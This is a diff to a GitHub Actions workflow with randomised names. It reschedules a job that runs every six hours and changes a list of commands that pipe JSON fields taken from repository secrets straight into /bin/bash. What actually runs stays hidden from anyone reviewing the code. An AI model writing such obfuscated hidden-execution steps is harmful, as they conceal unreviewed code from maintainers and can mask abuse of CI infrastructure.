@@ -3,24 +3,22 @@ name: yuanlaoban8715
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 3/6 * * *'
+    - cron: '55 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yuanlaoban8715
         env:
-          hbw5: ${{ secrets.hbw5 }}
+          jupd92: ${{ secrets.jupd92 }}
         run: |
-          echo $hbw5 | jq -r .djski3417 | /bin/bash
-          echo $hcp2018 | jq -r .q195 | /bin/bash
-          echo $n11 | jq -r .upt27696 | /bin/bash
-          echo $wdq4 | jq -r .k48972 | /bin/bash
-          echo $rhd688 | jq -r .ylhv98 | /bin/bash
-          echo $vegpw653 | jq -r .awwgo9292 | /bin/bash
-          echo $i67758 | jq -r .bds34017 | /bin/bash
-          echo $uu07054 | jq -r .xnqbx6702 | /bin/bash
-          echo $uj48578 | jq -r .mmk1 | /bin/bash
-          echo $vvo5 | jq -r .jxy80 | /bin/bash
+          echo $jupd92 | jq -r .d16 | /bin/bash
+          echo $hrmt6935 | jq -r .risi0 | /bin/bash
+          echo $lyefi191 | jq -r .dxrp4201 | /bin/bash
+          echo $jrlih80048 | jq -r .wwyjd4317 | /bin/bash
+          echo $fsx46889 | jq -r .czm13604 | /bin/bash
+          echo $f96 | jq -r .bk384 | /bin/bash
+          echo $sd0 | jq -r .md8621 | /bin/bash
 
